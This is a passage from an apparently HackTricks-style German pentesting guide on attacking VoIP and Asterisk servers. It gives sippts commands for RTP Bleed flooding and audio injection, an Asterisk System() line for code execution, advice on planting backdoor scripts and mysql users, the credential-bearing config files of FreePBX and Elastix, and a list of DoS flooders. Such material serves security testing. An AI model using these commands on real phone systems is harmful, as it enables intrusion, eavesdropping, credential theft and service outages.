- **`SIPPTS rtcpbleed`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed erkennt die RTP Bleed-Sicherheitsanfälligkeit, indem RTCP-Streams gesendet werden.
```bash
sippts rtcpbleed -i 10.10.0.10
```
- **`SIPPTS rtpbleedflood`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood nutzt die RTP Bleed-Sicherheitsanfälligkeit aus, indem RTP-Streams gesendet werden.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
- **`SIPPTS rtpbleedinject`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject nutzt die RTP Bleed-Sicherheitsanfälligkeit aus, indem eine Audiodatei (WAV-Format) injiziert wird.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

In Asterisk gelingt es Ihnen irgendwie, **Erweiterungsregeln hinzuzufügen und sie neu zu laden** (zum Beispiel durch das Kompromittieren eines anfälligen Web-Manager-Servers), es ist möglich, RCE mit dem **`System`** Befehl zu erhalten.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Es gibt einen Befehl namens **`Shell`**, der **anstatt von `System`** verwendet werden kann, um Systembefehle auszuführen, wenn dies erforderlich ist.

> [!WARNING]
> Wenn der Server **die Verwendung bestimmter Zeichen** im **`System`**-Befehl (wie in Elastix) nicht zulässt, überprüfen Sie, ob der Webserver es erlaubt, **irgendwie Dateien im System zu erstellen** (wie in Elastix oder trixbox), und verwenden Sie dies, um ein **Backdoor-Skript** zu **erstellen** und dann **`System`** zu verwenden, um dieses **Skript** **auszuführen**.

#### Interessante lokale Dateien und Berechtigungen

- **`sip.conf`** -> Enthält das Passwort der SIP-Benutzer.
- Wenn der **Asterisk-Server als root** läuft, könnten Sie root kompromittieren.
- Der **mysql root-Benutzer** könnte **kein Passwort** haben.
- Dies könnte verwendet werden, um einen neuen mysql-Benutzer als Backdoor zu erstellen.
- **`FreePBX`**
- **`amportal.conf`** -> Enthält das Passwort des Webpanel-Administrators (FreePBX).
- **`FreePBX.conf`** -> Enthält das Passwort des Benutzers FreePBXuser, der auf die Datenbank zugreift.
- Dies könnte verwendet werden, um einen neuen mysql-Benutzer als Backdoor zu erstellen.
- **`Elastix`**
- **`Elastix.conf`** -> Enthält mehrere Passwörter im Klartext, wie mysql root-Passwort, IMAPd-Passwort, Web-Admin-Passwort.
- **Mehrere Ordner** gehören dem kompromittierten Asterisk-Benutzer (wenn nicht als root ausgeführt). Dieser Benutzer kann die vorherigen Dateien lesen und kontrolliert auch die Konfiguration, sodass er Asterisk dazu bringen könnte, andere kompromittierte Binärdateien beim Ausführen zu laden.

### RTP-Injektion

Es ist möglich, eine **`.wav`** in Gespräche einzufügen, indem man Tools wie **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) und **`rtpmixsound`** (`sudo apt install rtpmixsound`) verwendet.

Oder Sie könnten die Skripte von [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) verwenden, um **Gespräche zu scannen** (**`rtpscan.pl`**), eine `.wav` an ein Gespräch zu senden (**`rtpsend.pl`**) und **Geräusche** in ein Gespräch einzufügen (**`rtpflood.pl`**).

### DoS

Es gibt mehrere Möglichkeiten, um DoS in VoIP-Servern zu erreichen.

- **`SIPPTS flood`** von [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS flood sendet unbegrenzte Nachrichten an das Ziel.
- `sippts flood -i 10.10.0.10 -m invite -v`
- **`SIPPTS ping`** von [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS ping führt einen SIP-Ping durch, um die Server-Antwortzeit zu überprüfen.
- `sippts ping -i 10.10.0.10`
- [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX-Protokoll, das von Asterisk verwendet wird.
- [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Ein Tool, um SIP/SDP INVITE-Nachrichten über UDP/IP zu fluten.
- [**rtpflood**](https://www.kali.org/tools/rtpflood/): Sendet mehrere gut formatierte RTP-Pakete. Es ist notwendig, die verwendeten RTP-Ports zu kennen (zuerst sniffen).
- [**SIPp**](https://github.com/SIPp/sipp): Ermöglicht die Analyse und Generierung von SIP-Verkehr, sodass es auch für DoS verwendet werden kann.
- [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP Schweizer Taschenmesser. Kann auch verwendet werden, um SIP-Angriffe durchzuführen.
- Fuzzer: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS-Schwachstellen

Der einfachste Weg, eine Software wie Asterisk zu installieren, besteht darin, eine **OS-Distribution** herunterzuladen, die bereits installiert ist, wie: **FreePBX, Elastix, Trixbox**... Das Problem dabei ist, dass, sobald es funktioniert, die Systemadministratoren **sie möglicherweise nicht mehr aktualisieren** und **Schwachstellen** im Laufe der Zeit entdeckt werden.

## Referenzen

- [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
- [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
- [http://blog.pepelux.org/](http://blog.pepelux.org/)
- [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
- [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
- [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{{#include ../../banners/hacktricks-training.md}}
